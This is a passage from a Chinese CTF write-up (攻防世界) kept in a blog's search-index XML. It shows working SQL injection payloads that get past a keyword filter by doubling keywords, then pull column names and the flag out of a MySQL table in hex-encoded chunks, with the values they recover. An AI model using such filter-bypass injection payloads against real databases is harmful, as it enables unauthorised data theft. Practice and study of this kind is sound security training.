table_name=&#39;hello_flag_is_here&#39;)),1,12),16,10))+&#39;#i_am_f&#39;+(selecselectt conv(substr(hex((selecselectt group_concat(column_name) frfromom information_schema.columns where table_name=&#39;hello_flag_is_here&#39;)),13,12),16,10))+&#39;#lag#i_am_flag</code></pre><p>得到数据</p><pre><code class="mysql">&#39;+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),1,12),16,10))+&#39;#!!_@m_&#39;+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),13,12),16,10))+&#39;#Th.e_F&#39;+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),25,12),16,10))+&#39;#!lag#!!_@m_Th.e_F!lag</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
